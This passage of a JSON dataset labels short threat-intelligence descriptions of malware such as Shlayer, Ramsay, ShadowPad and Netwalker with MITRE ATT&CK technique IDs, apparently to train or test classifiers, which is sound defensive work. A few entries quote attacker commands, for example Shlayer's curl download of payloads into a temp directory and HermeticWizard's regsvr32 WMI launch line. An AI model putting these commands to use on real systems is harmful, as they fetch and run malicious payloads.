    "text": "KONNI can gather the OS version, architecture information, connected drives, hostname, RAM size, and disk space information from the victim’s machine and has used cmd /c systeminfo command to get a snapshot of the current system state of the target machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "KONNI can collect the IP address from the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "KONNI can collect the username from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "OSX/Shlayer uses the command appDir=\"$(dirname $(dirname \"$currentDir\"))\" and $(dirname \"$(pwd -P)\") to construct installation paths.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "OSX/Shlayer can download payloads, and extract bytes from files. OSX/Shlayer uses the curl -fsL \"$url\" >$tmp_path command to download malicious payloads into a temporary directory.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "OSX/Shlayer collects the IOPlatformUUID, session UID, and the OS version using the command sw_vers -productVersion.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "NotPetya searches for files ending with dozens of different file extensions prior to encryption.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "esentutl can be used to collect data from local file systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "esentutl can be used to copy files from a given URL.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "GoldenSpy has included a program \"ExeProtector\", which monitors for the existence of GoldenSpy on the infected system and redownloads if necessary.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "GoldenSpy constantly attempts to download and execute files from the remote C2, including GoldenSpy itself if not found on the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "GoldenSpy can execute remote commands in the Windows command shell using the WinExec() API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "GoldenSpy has gathered operating system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Ramsay can collect Microsoft Word documents from the target's file system, as well as .txt, .doc, and .xls files from the Internet Explorer cache.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Ramsay can collect directory and file lists.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Ramsay can use Windows API functions such as WriteFile, CloseHandle, and GetCurrentHwProfile during its collection and file storage operations. Ramsay can execute its embedded components via CreateProcessA and ShellExecute.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Ramsay can gather a list of running processes by using Tasklist.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Ramsay can use ImprovedReflectiveDLLInjection to deploy components.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Ramsay can detect system information--including disk names, total space, and remaining space--to create a hardware profile GUID which acts as a system identifier for operators.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Ramsay can use ipconfig and Arp to collect network configuration information, including routing information and ARP tables.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Cryptoistic can retrieve files from the local file system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Cryptoistic can scan a directory to identify files for deletion.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Cryptoistic has the ability to send and receive files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cryptoistic can gather data on the user of a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Chaes can download additional files onto an infected machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Chaes stored its instructions in a config file in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Chaes used the CreateFileW() API function with read permissions to access downloaded payloads.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Chaes has collected system information, including the machine name and OS version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Chaes has collected the username and UID from the infected machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "down_new has the ability to list the directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "down_new has the ability to download files to the compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "down_new has the ability to list running processes on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "down_new has the ability to identify the system volume information of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "down_new has the ability to identify the MAC address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "FIVEHANDS has the ability to enumerate files on a compromised host in order to encrypt files with specific extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "FIVEHANDS can use WMI to delete files on a target machine.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "KGH_SPY can send a file containing victim system information to C2.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "KGH_SPY can enumerate files and directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "KGH_SPY has the ability to download and execute code from remote servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "KGH_SPY can collect drive information from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Bonadan can download additional modules from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Bonadan can use the ps command to discover other cryptocurrency miners active on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Bonadan has discovered the OS version, CPU model, and RAM size of the system it has been installed on.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Bonadan can find the external IP address of the infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Bonadan has discovered the username of the user running the backdoor.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "VaporRage has the ability to download malicious shellcode to compromised systems.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WinMM uses NetUser-GetInfo to identify that it is running under an \"Admin\" account on the local system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Clop has searched folders and subfolders for files to encrypt.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Clop can make modifications to Registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Clop has used built-in API functions such as WNetOpenEnumW(), WNetEnumResourceW(), WNetCloseEnum(), GetProcAddress(), and VirtualAlloc().",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Clop can enumerate all processes on the victim's machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "ShadowPad has downloaded code from a C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ShadowPad maintains a configuration block and virtual file system in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "ShadowPad has collected the PID of a malicious process.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "ShadowPad has injected an install module into a newly created process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ShadowPad has injected a DLL into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ShadowPad has discovered system information including memory status, CPU frequency, OS versions, and volume serial numbers.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ShadowPad has collected the domain name of the victim system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "ShadowPad has collected the username of the victim system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "BloodHound can use .NET API calls in the SharpHound ingestor component to pull Active Directory data.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "BloodHound can collect information on user sessions.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "jRAT collects information about the OS (version, build type, install date) as well as system up-time upon receiving a connection from a backdoor.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "jRAT uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Egregor has the ability to download files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Egregor has used the Windows API to make detection more difficult.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Egregor can inject its payload into iexplore.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Egregor can perform a language check of the infected system and can query the CPU information (cupid).",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Egregor has used tools to gather information about users.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "4H RAT has the capability to obtain a listing of running processes (including loaded modules).",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Diavol has a command to traverse the files and directories in a given path.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Diavol can receive configuration updates and additional payloads including wscpy.exe from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Diavol has used several API calls like GetLogicalDriveStrings, SleepEx, SystemParametersInfoAPI, CryptEncrypt, and others to execute parts of its attack.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Diavol has used CreateToolhelp32Snapshot, Process32First, and Process32Next API calls to enumerate the running processes in the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Diavol can collect the computer name and OS version from the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Diavol can enumerate victims' local and external IPs when registering with C2.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Diavol can collect the username from a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "LoudMiner used SCP to update the miner from the C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "LoudMiner used the ps command to monitor the running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "LoudMiner has monitored CPU usage.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "LoudMiner used a script to gather the IP address of the infected machine before sending to the C2.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "RegDuke can download files from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RegDuke can store its encryption key in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "USBferry can collect information from an air-gapped host machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "USBferry can detect the victim's file or folder list.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "USBferry can use tasklist to gather information about the process running on the infected system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "USBferry can detect the infected machine's network topology using ipconfig and arp.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "IcedID has the ability to download additional modules and a configuration file from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "IcedID has called ZwWriteVirtualMemory, ZwProtectVirtualMemory, ZwQueueApcThread, and NtResumeThread to inject itself into a remote process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "IcedID has used ZwQueueApcThread to inject itself into remote processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "IcedID has the ability to identify the computer name and OS version on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "IcedID has used WMI to execute binaries.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "After decrypting itself in memory, RARSTONE downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This \"downloaded\" file is actually not dropped onto the system.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Maze has used several Windows API functions throughout the encryption process including IsDebuggerPresent, TerminateProcess, Process32FirstW, among others.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Maze has gathered all of the running system processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Maze has injected the malware DLL into a target process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Maze has checked the language of the infected system using the \"GetUSerDefaultUILanguage\" function.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Maze has used WMI to attempt to delete the shadow volumes on a machine, and to connect a virtual machine to the network domain of the victim organization's network.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "LOWBALL uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the LOWBALL malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RemoteUtilities can enumerate files and directories on a target machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "RemoteUtilities can upload and download files to and from a target machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ROADTools leverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "BLINDINGCAN has uploaded files from victim machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "BLINDINGCAN can search, read, write, move, and execute files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BLINDINGCAN has downloaded files to a victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BLINDINGCAN has collected from a victim machine the system name, processor information, OS version, and disk information, including type and free space available.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BLINDINGCAN has collected the victim machine's local IP address information and MAC address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "MechaFlounder has the ability to upload and download files to and from a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "MechaFlounder has the ability to identify the username and hostname on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Machete can download additional files for execution on the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Machete collects the MAC address of the target computer and other network configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "FrameworkPOS can collect elements related to credit card data from process memory.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "FrameworkPOS can enumerate and exclude selected processes on a compromised host to speed execution of memory scraping.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Wevtutil can be used to export events from a specific log.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT checks its current working directory upon execution and also contains watchdog functionality that ensures its executable is located in the correct path (else it will rewrite the payload).",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT can download and execute additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT sets HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load to point to its executable.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT contains watchdog functionality that periodically ensures HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load is set to point to its executable.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Imminent Monitor has a dynamic debugging feature to check whether it is located in the %TEMP% directory, otherwise it copies itself there.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Imminent Monitor has leveraged CreateProcessW() call to execute the debugger.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Imminent Monitor has a \"Process Watcher\" feature to monitor processes in case the client ever crashes or gets closed.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Sibot can download and execute a payload onto a compromised system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Sibot has installed a second-stage script in the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot registry key.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Sibot has queried the registry for proxy server information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Sibot checked if the compromised system is configured to use proxies.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Sibot has used WMI to discover network connections and configurations. Sibot has also used the Win32_Process class to execute a malicious DLL.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Derusbi injects itself into the secure shell (SSH) process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Derusbi gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A Linux version of Derusbi checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges. Derusbi also gathers the username of the victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "MCMD has the ability to upload files from an infected device.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "MCMD can upload additional files to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Exaramel for Linux has a command to download a file from and to a remote C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Exaramel for Linux can run whoami to identify the system owner.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy searches for files that are 60mb and less and contain the following extensions: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .exe, .zip, and .rar. Zebrocy also runs the echo %APPDATA% command to list the contents of the directory.[9][7][8] Zebrocy can obtain the current execution path as well as perform drive enumeration.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy collects the OS version, computer name and serial number for the storage volume C:. Zebrocy also runs the systeminfo command to gather system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy runs the ipconfig /all command.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Turian can search for specific files and list directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Turian can download additional files and tools from its C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Turian can retrieve system information including OS version, memory usage, local hostname, and system adapter information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Turian can retrieve the internal IP address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Turian can retrieve usernames.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "POWERSTATS has used get_tasklist to discover processes on the compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "POWERSTATS can retrieve IP, network adapter configuration information, and domain from compromised hosts.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "POWERSTATS has the ability to identify the username on the compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Mis-Type may create a file containing the results of the command cmd.exe /c ipconfig /all.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Carbon can list the processes on the victim’s machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Carbon can collect the IP address of the victims and other computers on the network using the commands: ipconfig -all nbtstat -n, and nbtstat -s.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "SILENTTRINITY has several modules, such as ls.py, pwd.py, and recentFiles.py, to enumerate directories and files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SILENTTRINITY can load additional files and tools, including Mimikatz.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SILENTTRINITY can modify registry keys, including to enable or disable Remote Desktop Protocol (RDP).",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "SILENTTRINITY has the ability to leverage API including GetProcAddress and LoadLibrary.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "SILENTTRINITY can enumerate processes, including properties to determine if they have the Common Language Runtime (CLR) loaded.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "SILENTTRINITY can inject shellcode directly into Excel.exe or a specific process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "SILENTTRINITY can use the GetRegValue function to check Registry keys within HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated and HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated. It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "SILENTTRINITY can collect information related to a compromised host, including OS version and a list of drives.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SILENTTRINITY can gather a list of logged on users.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "SILENTTRINITY can use WMI for lateral movement.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "OceanSalt can collect the victim’s IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "XCSSET collects contacts and application data from files in Desktop, Documents, Downloads, Dropbox, and WeChat folders.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "XCSSET downloads browser specific AppleScript modules using a constructed URL with the curl command, https://\" & domain & \"/agent/scripts/\" & moduleName & \".applescript.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "XCSSET identifies the macOS version and uses ioreg to determine serial number.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "HermeticWizard can connect to remote shares using WNetAddConnection2W.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "HermeticWizard can use WMI to create a new process on a remote machine via C:\\windows\\system32\\cmd.exe /c start C:\\windows\\system32\\\\regsvr32.exe /s /iC:\\windows\\<filename>.dll.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Lucifer can download and execute a replica of itself using certutil.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Lucifer can identify the process that owns remote connections.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Lucifer can check for existing stratum cryptomining information in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr – %stratum info%.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Lucifer can collect the computer name, system architecture, default language, and processor frequency of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Lucifer can collect the IP address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Lucifer has the ability to identify the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Lucifer can use WMI to log into remote machines for propagation.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Goopy has the ability to exfiltrate documents from infected systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Goopy has the ability to enumerate the infected system's user name via GetUserNameW.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Goopy has checked for the Google Updater process to ensure Goopy was loaded properly.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Goopy has the ability to enumerate the infected system's user name.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Netwalker can add the following registry entry: HKEY_CURRENT_USER\\SOFTWARE{8 random characters}.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Netwalker can use Windows API functions to inject the ransomware DLL.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The Netwalker DLL has been injected reflectively into the memory of a legitimate running process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Netwalker can determine the system architecture it is running on to choose which version of the DLL to use.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Netwalker can use WMI to delete Shadow Volumes.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "KEYMARBLE has a command to search for files on the victim’s machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "KEYMARBLE can upload files to the victim’s machine and can download additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "KEYMARBLE has a command to create Registry entries for storing data under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WABE\\DataPath.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "KEYMARBLE gathers the MAC address of the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Dacls can scan directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Dacls can download its payload from a C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Dacls can collect data on running and parent processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "HotCroissant has the ability to retrieve a list of files in a given directory as well as drives and drive types.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "HotCroissant has the ability to upload a file from the command and control (C2) server to the victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "HotCroissant can perform dynamic DLL importing and API lookups using LoadLibrary and GetProcAddress on obfuscated strings.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "HotCroissant has the ability to list running processes on the infected host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "HotCroissant has the ability to determine if the current user is an administrator, Windows product name, processor name, screen resolution, and physical RAM of the infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "HotCroissant has the ability to identify the IP address of the compromised machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "HotCroissant has the ability to collect the username on the infected host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
